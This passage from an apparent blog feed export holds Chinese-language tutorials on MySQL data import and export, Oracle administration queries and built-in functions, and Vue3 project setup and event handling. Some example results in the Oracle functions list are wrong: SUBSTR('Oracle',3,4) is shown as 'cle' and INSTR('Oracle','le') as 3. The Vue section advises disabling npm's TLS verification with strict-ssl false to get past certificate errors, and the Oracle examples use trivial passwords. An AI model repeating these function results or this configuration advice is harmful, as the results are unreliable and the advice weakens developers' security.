<h2 id="数据导入导出"><a href="#数据导入导出" class="headerlink" title="数据导入导出"></a>数据导入导出</h2><h3 id="数据导出-SELECT-…-INTO-OUTFILE"><a href="#数据导出-SELECT-…-INTO-OUTFILE" class="headerlink" title="数据导出-SELECT … INTO OUTFILE"></a>数据导出-SELECT … INTO OUTFILE</h3><h4 id="导出users表的所有数据到CSV文件"><a href="#导出users表的所有数据到CSV文件" class="headerlink" title="导出users表的所有数据到CSV文件"></a>导出users表的所有数据到CSV文件</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, username, email <span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/users_data.csv&#x27;</span></span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;,&#x27;</span> ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>&#x2F;tmp&#x2F;users_data.csv：文件保存路径，需要确保MySQL用户有写入权限。</li>
<li>FIELDS TERMINATED BY ‘,’：指定字段之间用逗号分隔。</li>
<li>ENCLOSED BY ‘“‘：指定字段内容用双引号括起来（特别是字符串类型）。</li>
<li>LINES TERMINATED BY ‘\n’：指定每一行以换行符结束。</li>
</ul>
<h4 id="导出查询结果"><a href="#导出查询结果" class="headerlink" title="导出查询结果"></a>导出查询结果</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product_name, price <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Electronics&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/lib/mysql-files/electronics_products.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="数据导入-LOAD-DATA-INFILE"><a href="#数据导入-LOAD-DATA-INFILE" class="headerlink" title="数据导入-LOAD DATA INFILE"></a>数据导入-LOAD DATA INFILE</h3><h4 id="从CSV文件导入数据到users表"><a href="#从CSV文件导入数据到users表" class="headerlink" title="从CSV文件导入数据到users表"></a>从CSV文件导入数据到users表</h4><p>假设&#x2F;tmp&#x2F;new_users.csv文件内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">101,&quot;Alice&quot;,&quot;alice@example.com&quot;</span><br><span class="line">102,&quot;Bob&quot;,&quot;bob@example.com&quot;</span><br></pre></td></tr></table></figure>
<p>导入命令：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">&#x27;/tmp/new_users.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> users</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;,&#x27;</span> ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">(id, username, email);</span><br></pre></td></tr></table></figure>
<ul>
<li>(id, username, email)：指定文件中列的顺序与表中列的对应关系。</li>
</ul>
<h4 id="跳过文件头"><a href="#跳过文件头" class="headerlink" title="跳过文件头"></a>跳过文件头</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LOAD DATA INFILE <span class="string">&#x27;/tmp/users_with_header.csv&#x27;</span></span><br><span class="line"><span class="keyword">INTO</span> <span class="keyword">TABLE</span> users</span><br><span class="line">FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;,&#x27;</span> ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">IGNORE <span class="number">1</span> LINES; <span class="comment">-- 忽略文件第一行</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle数据库一【基础语句】</title>
    <url>/cnblogs.github.io/p/16816.html</url>
    <content><![CDATA[<h3 id="Oracle数据库连接"><a href="#Oracle数据库连接" class="headerlink" title="Oracle数据库连接"></a>Oracle数据库连接</h3><p>三种以系统管理员身份连接数据库的方式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">conn / as sysdba  -- 无需监听进程</span><br><span class="line">conn system/admin  -- 本地连接</span><br><span class="line">conn system/admin@oracle  -- 需要监听进程</span><br></pre></td></tr></table></figure>
<p>查看当前数据库有多少用户连接</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username, sid, serial# <span class="keyword">from</span> v$session;</span><br></pre></td></tr></table></figure>
<p>监听服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsnrctl start  -- 启动监听  </span><br><span class="line">lsnrctl stop   -- 关闭监听  </span><br><span class="line">lsnrctl status -- 查看监听状态</span><br></pre></td></tr></table></figure>
<p>Oracle实例服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">startup;  -- 启动实例</span><br><span class="line">shutdown immediate;  -- 关闭实例</span><br><span class="line">select * from v$instance;  -- 查看实例状态</span><br></pre></td></tr></table></figure>

<h3 id="Oracle用户管理"><a href="#Oracle用户管理" class="headerlink" title="Oracle用户管理"></a>Oracle用户管理</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看系统已有用户</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_users;</span><br><span class="line"></span><br><span class="line"># 显示当前连接用户</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br><span class="line"># 创建新用户并授权</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> a identified <span class="keyword">by</span> a;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">connect</span>, resource <span class="keyword">to</span> a;</span><br><span class="line"></span><br><span class="line"># 修改用户密码</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> a identified <span class="keyword">by</span> <span class="number">123456</span>;</span><br><span class="line"></span><br><span class="line"># 授权用户可以访问数据库所有表</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span> <span class="keyword">any</span> <span class="keyword">table</span> <span class="keyword">to</span> a;</span><br><span class="line"></span><br><span class="line"># 授权用户操作其他用户的表</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>, <span class="keyword">insert</span>, <span class="keyword">update</span>, <span class="keyword">delete</span> <span class="keyword">on</span> student.emp <span class="keyword">to</span> a;</span><br><span class="line"></span><br><span class="line"># 查找用户下的所有表</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tab;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的默认表空间</span><br><span class="line"><span class="keyword">select</span> username, default_tablespace <span class="keyword">from</span> user_users;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的角色</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_role_privs;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的权限</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_sys_privs;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_tab_privs;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle表操作"><a href="#Oracle表操作" class="headerlink" title="Oracle表操作"></a>Oracle表操作</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看用户下所有的表</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_tables;</span><br><span class="line"></span><br><span class="line"># 查找表名包含&quot;LOG&quot;的表</span><br><span class="line"><span class="keyword">select</span> object_name, object_id <span class="keyword">from</span> user_objects <span class="keyword">where</span> instr(object_name, <span class="string">&#x27;LOG&#x27;</span>) <span class="operator">&gt;</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"># 查看表的创建时间</span><br><span class="line"><span class="keyword">select</span> object_name, created <span class="keyword">from</span> user_objects <span class="keyword">where</span> object_name <span class="operator">=</span> <span class="built_in">upper</span>(<span class="string">&#x27;&amp;table_name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 查看表的大小</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(bytes) <span class="operator">/</span> (<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>) <span class="keyword">as</span> &quot;size(M)&quot; <span class="keyword">from</span> user_segments <span class="keyword">where</span> segment_name <span class="operator">=</span> <span class="built_in">upper</span>(<span class="string">&#x27;&amp;table_name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 查看存放在Oracle内存区的表</span><br><span class="line"><span class="keyword">select</span> table_name, cache <span class="keyword">from</span> user_tables <span class="keyword">where</span> instr(cache, <span class="string">&#x27;Y&#x27;</span>) <span class="operator">&gt;</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle索引"><a href="#Oracle索引" class="headerlink" title="Oracle索引"></a>Oracle索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看索引个数和类别</span><br><span class="line"><span class="keyword">select</span> index_name, index_type, table_name <span class="keyword">from</span> user_indexes <span class="keyword">order</span> <span class="keyword">by</span> table_name;</span><br><span class="line"></span><br><span class="line"># 查看索引所涉及的字段</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_ind_columns <span class="keyword">where</span> index_name <span class="operator">=</span> <span class="built_in">upper</span>(<span class="string">&#x27;&amp;index_name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 查看索引大小</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(bytes) <span class="operator">/</span> (<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>) <span class="keyword">as</span> &quot;size(M)&quot; <span class="keyword">from</span> user_segments <span class="keyword">where</span> segment_name <span class="operator">=</span> <span class="built_in">upper</span>(<span class="string">&#x27;&amp;index_name&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Oracle数据库管理"><a href="#Oracle数据库管理" class="headerlink" title="Oracle数据库管理"></a>Oracle数据库管理</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看表空间的名称及大小</span><br><span class="line"><span class="keyword">select</span> t.tablespace_name, round(<span class="built_in">sum</span>(bytes<span class="operator">/</span>(<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>)),<span class="number">0</span>) ts_size <span class="keyword">from</span> dba_tablespaces t, dba_data_files d <span class="keyword">where</span> t.tablespace_name <span class="operator">=</span> d.tablespace_name <span class="keyword">group</span> <span class="keyword">by</span> t.tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看表空间物理文件的名称及大小</span><br><span class="line"><span class="keyword">select</span> tablespace_name, file_id, file_name, round(bytes<span class="operator">/</span>(<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>),<span class="number">0</span>) total_space <span class="keyword">from</span> dba_data_files <span class="keyword">order</span> <span class="keyword">by</span> tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看回滚段名称及大小</span><br><span class="line"><span class="keyword">select</span> segment_name, tablespace_name, r.status, (initial_extent<span class="operator">/</span><span class="number">1024</span>) InitialExtent, (next_extent<span class="operator">/</span><span class="number">1024</span>) NextExtent, max_extents, v.curext CurExtent <span class="keyword">from</span> dba_rollback_segs r, v$rollstat v <span class="keyword">where</span> r.segment_id <span class="operator">=</span> v.usn(<span class="operator">+</span>) <span class="keyword">order</span> <span class="keyword">by</span> segment_name;</span><br><span class="line"></span><br><span class="line"># 查看控制文件</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> v$controlfile;</span><br><span class="line"></span><br><span class="line"># 查看日志文件</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">member</span> <span class="keyword">from</span> v$logfile;</span><br><span class="line"></span><br><span class="line"># 查看表空间的使用情况</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(bytes)<span class="operator">/</span>(<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>) <span class="keyword">as</span> free_space, tablespace_name <span class="keyword">from</span> dba_free_space <span class="keyword">group</span> <span class="keyword">by</span> tablespace_name;</span><br><span class="line"></span><br><span class="line"># 查看数据库对象</span><br><span class="line"><span class="keyword">select</span> owner, object_type, status, <span class="built_in">count</span>(<span class="operator">*</span>) count# <span class="keyword">from</span> all_objects <span class="keyword">group</span> <span class="keyword">by</span> owner, object_type, status;</span><br><span class="line"></span><br><span class="line"># 查看数据库版本</span><br><span class="line"><span class="keyword">select</span> version <span class="keyword">FROM</span> Product_component_version <span class="keyword">where</span> SUBSTR(PRODUCT,<span class="number">1</span>,<span class="number">6</span>)<span class="operator">=</span><span class="string">&#x27;Oracle&#x27;</span>;</span><br><span class="line"></span><br><span class="line"># 查看数据库的创建日期和归档方式</span><br><span class="line"><span class="keyword">select</span> Created, Log_Mode <span class="keyword">From</span> V$Database;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle数据库二【常用函数】</title>
    <url>/cnblogs.github.io/p/c983.html</url>
    <content><![CDATA[<h2 id="一、字符函数（处理字符串数据）"><a href="#一、字符函数（处理字符串数据）" class="headerlink" title="一、字符函数（处理字符串数据）"></a>一、字符函数（处理字符串数据）</h2><ol>
<li>LOWER(char)：将字符串转换为小写。<br><strong>示例：</strong>SELECT LOWER(‘ABC’) FROM DUAL; 结果：’abc’。</li>
<li>UPPER(char)：将字符串转换为大写。<br><strong>示例：</strong>SELECT UPPER(‘abc’) FROM DUAL; 结果：’ABC’。</li>
<li>LENGTH(char)：返回字符串的长度。<br><strong>示例：</strong>SELECT LENGTH(‘Hello’) FROM DUAL; 结果：5。</li>
<li>SUBSTR(char, start, length)：截取子串（从start位置开始，截取length个字符）。<br><strong>示例：</strong>SELECT SUBSTR(‘Oracle’, 3, 4) FROM DUAL; 结果：’cle’。</li>
<li>REPLACE(char, old, new)：替换字符串中的指定内容。<br><strong>示例：</strong>SELECT REPLACE(‘ABCABC’, ‘B’, ‘X’) FROM DUAL; 结果：’AXCAXC’。</li>
<li>INSTR(char, substring)：返回子串在字符串中第一次出现的位置。<br><strong>示例：</strong>SELECT INSTR(‘Oracle’, ‘le’) FROM DUAL; 结果：3。</li>
</ol>
<h2 id="二、数学函数（处理数值计算）"><a href="#二、数学函数（处理数值计算）" class="headerlink" title="二、数学函数（处理数值计算）"></a>二、数学函数（处理数值计算）</h2><ol>
<li>ROUND(n, m)：四舍五入到小数点后m位或整数。<br><strong>示例：</strong>SELECT ROUND(3.1415, 2) FROM DUAL; 结果：3.14。</li>
<li>TRUNC(n, m)：截断数字到小数点后m位或整数。<br><strong>示例：</strong>SELECT TRUNC(3.1415, 2) FROM DUAL; 结果：3.14。</li>
<li>MOD(m, n)：返回m除以n的余数。<br><strong>示例：</strong>SELECT MOD(10, 3) FROM DUAL; 结果：1。</li>
<li>CEIL(n)：返回大于等于n的最小整数（向上取整）。<br><strong>示例：</strong>SELECT CEIL(3.2) FROM DUAL; 结果：4。</li>
<li>FLOOR(n)：返回小于等于n的最大整数（向下取整）。<br><strong>示例：</strong>SELECT FLOOR(3.8) FROM DUAL; 结果：3。</li>
</ol>
<h2 id="三、日期函数（处理日期和时间）"><a href="#三、日期函数（处理日期和时间）" class="headerlink" title="三、日期函数（处理日期和时间）"></a>三、日期函数（处理日期和时间）</h2><ol>
<li>SYSDATE：返回当前系统日期和时间。<br><strong>示例：</strong>SELECT SYSDATE FROM DUAL; 结果：当前日期时间（如’2025-06-19 12:34:56’）。</li>
<li>ADD_MONTHS(date, months)：在日期上增加指定月数。<br><strong>示例：</strong>SELECT ADD_MONTHS(SYSDATE, 6) FROM DUAL; 结果：当前日期加6个月后的日期。</li>
<li>LAST_DAY(date)：返回指定日期所在月份的最后一天。<br><strong>示例：</strong>SELECT LAST_DAY(‘2025-06-15’) FROM DUAL; 结果：’2025-06-30’。</li>
<li>MONTHS_BETWEEN(date1, date2)：返回两个日期之间的月数差。<br><strong>示例：</strong>SELECT MONTHS_BETWEEN(‘2025-06-19’, ‘2024-01-01’) FROM DUAL; 结果：约17个月。</li>
<li>TO_CHAR(date, format)：将日期转换为指定格式的字符串。<br><strong>示例：</strong>SELECT TO_CHAR(SYSDATE, ‘YYYY-MM-DD HH24:MI:SS’) FROM DUAL; 结果：’2025-06-19 12:34:56’。</li>
</ol>
<h2 id="四、转换函数（数据类型转换）"><a href="#四、转换函数（数据类型转换）" class="headerlink" title="四、转换函数（数据类型转换）"></a>四、转换函数（数据类型转换）</h2><ol>
<li>TO_CHAR(n&#x2F; date, format)：将数值或日期转换为字符串。<br><strong>示例：</strong>SELECT TO_CHAR(1234.56, ‘L99999.99’) FROM DUAL; 结果：本地货币符号 + 数值（如’$1,234.56’）。</li>
<li>TO_DATE(string, format)：将字符串按格式转换为日期。<br><strong>示例：</strong>SELECT TO_DATE(‘2025-06-19’, ‘YYYY-MM-DD’) FROM DUAL; 结果：日期类型’2025-06-19’。</li>
<li>TO_NUMBER(string)：将字符串转换为数值。<br><strong>示例：</strong>SELECT TO_NUMBER(‘123.45’) FROM DUAL; 结果：123.45。</li>
<li>CAST(expr AS data_type)：显式类型转换（如CAST(‘2025’ AS DATE)）。</li>
</ol>
<h2 id="五、逻辑与条件函数"><a href="#五、逻辑与条件函数" class="headerlink" title="五、逻辑与条件函数"></a>五、逻辑与条件函数</h2><ol>
<li>DECODE(expr, value1, result1,…, default)：类似CASE WHEN的简单条件判断。<br><strong>示例：</strong>SELECT DECODE(job, ‘MANAGER’, ‘经理’, ‘SALESMAN’, ‘销售’, ‘其他’) FROM emp;</li>
<li>CASE WHEN condition THEN result [ELSE default] END：多条件分支。<br><strong>示例：</strong>SELECT CASE WHEN sal &gt; 5000 THEN ‘高薪’ ELSE ‘普通’ END FROM emp;</li>
</ol>
<h2 id="六、其他常用函数"><a href="#六、其他常用函数" class="headerlink" title="六、其他常用函数"></a>六、其他常用函数</h2><ol>
<li>SYS_CONTEXT(‘参数’, ‘值’)：获取系统上下文信息（如当前用户、数据库名等）。<br><strong>示例：</strong>SELECT SYS_CONTEXT(‘USERENV’, ‘SESSION_USER’) FROM DUAL; 结果：当前会话用户。</li>
<li>ROW_NUMBER() OVER (PARTITION BY… ORDER BY…)：分组排序生成序号。<br><strong>示例：</strong>SELECT ROW_NUMBER() OVER (PARTITION BY deptno ORDER BY sal DESC) AS rank FROM emp;</li>
<li>NVL(expr1, expr2)：如果expr1为NULL，返回expr2。<br><strong>示例：</strong>SELECT NVL(comm, 0) FROM emp; 将空佣金替换为0。</li>
</ol>
<p><strong>总结：</strong> Oracle函数涵盖字符处理、数学计算、日期操作、类型转换及逻辑判断等场景，掌握常用函数可大幅提升数据查询与处理的效率。需根据实际需求选择合适的函数，并理解参数格式与返回值类型。</p>
]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结一【安装、开发环境和目录结构】</title>
    <url>/cnblogs.github.io/p/6f9c.html</url>
    <content><![CDATA[<h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><ul>
<li>官网直接下载：<a href="https://nodejs.org/">https://nodejs.org/</a></li>
<li>安装node.js</li>
<li>安装淘宝镜像记录：管理员运行cmd</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果是mac，需要加<span class="built_in">sudo</span></span></span><br><span class="line">npm install cnpm -g --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
<ul>
<li>这时候如果有些人会报错，证书过期不能访问之类的 需要加上</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set strict-ssl false</span><br></pre></td></tr></table></figure>

<h2 id="创建Vue项目"><a href="#创建Vue项目" class="headerlink" title="创建Vue项目"></a>创建Vue项目</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm init vue@latest</span><br></pre></td></tr></table></figure>
<p>如果安装很慢，或者提示带有 proxy 之类的错误，可以切换镜像：</p>
<ul>
<li>查看当前镜像源，输入命令：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure>
<ul>
<li>切换当前镜像源为下面的镜像：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com</span><br></pre></td></tr></table></figure>
<ul>
<li>清除npm 内缓存：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm cache clean --force</span><br></pre></td></tr></table></figure>
<p>安装后会有提示，除了创建名称外，其他的暂时选否。用到的时候再安装</p>
<p>成功后执行如下操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入项目目录</span></span><br><span class="line">cd vue-project</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">我们这里不用npm install，cnpm比较快</span></span><br><span class="line">cnpm install</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行项目</span></span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>

<h2 id="Vue项目目录结构"><a href="#Vue项目目录结构" class="headerlink" title="Vue项目目录结构"></a>Vue项目目录结构</h2><table>
<thead>
<tr>
<th>文件名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.vscode</td>
<td>VSCode工具的配置文件夹</td>
</tr>
<tr>
<td>node_modules</td>
<td>Vue项目的运行依赖文件夹</td>
</tr>
<tr>
<td>public</td>
<td>资源文件夹（浏览器图标）</td>
</tr>
<tr>
<td>src</td>
<td>源码文件夹</td>
</tr>
<tr>
<td>.gitignore</td>
<td>git忽略文件</td>
</tr>
<tr>
<td>index.html</td>
<td>入口HTML文件</td>
</tr>
<tr>
<td>package.json</td>
<td>信息描述文件</td>
</tr>
<tr>
<td>README.md</td>
<td>注释文件</td>
</tr>
<tr>
<td>vite.config.js</td>
<td>Vue配置文件</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结七【Vue事件处理-事件参数】</title>
    <url>/cnblogs.github.io/p/a020.html</url>
    <content><![CDATA[<p><strong>事件参数</strong><br>事件参数可以获取 event 对象和通过事件传递数据</p>
<h3 id="获取event对象"><a href="#获取event对象" class="headerlink" title="获取event对象"></a>获取event对象</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">count</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">        &#125;       </span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        	<span class="comment">// event对象</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">addCount</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// Vue的event对象，就是原生JS中的event对象</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">target</span>) <span class="comment">// 获取当前点击的元素</span></span></span><br><span class="line"><span class="language-javascript">                e.<span class="property">target</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;Add&#x27;</span>+<span class="variable language_">this</span>.<span class="property">count</span> <span class="comment">// 修改当前点击元素的内容</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">count</span>++</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>内联事件处理<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addCount&quot;</span>&gt;</span>Add<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">count</span>: <span class="number">0</span></span></span><br><span class="line"><span class="language-javascript">        &#125;       </span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">addCount</span>(<span class="params">msg</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(msg)</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">count</span>++</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>内联事件处理<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addCount(&#x27;hello&#x27;)&quot;</span>&gt;</span>Add<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="获取列表里的内容"><a href="#获取列表里的内容" class="headerlink" title="获取列表里的内容"></a>获取列表里的内容</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>:[<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;lisi&#x27;</span>,<span class="string">&#x27;wangwu&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;       </span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">getNameHandle</span>(<span class="params">name</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(name)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>内联事件处理<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 当前元素的点击事件，打印当前元素的name --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> @<span class="attr">click</span>=<span class="string">&quot;getNameHandle(name)&quot;</span> <span class="attr">v-for</span>=<span class="string">&quot;(name,index) of names&quot;</span> <span class="attr">:Key</span>=<span class="string">&quot;index&quot;</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span 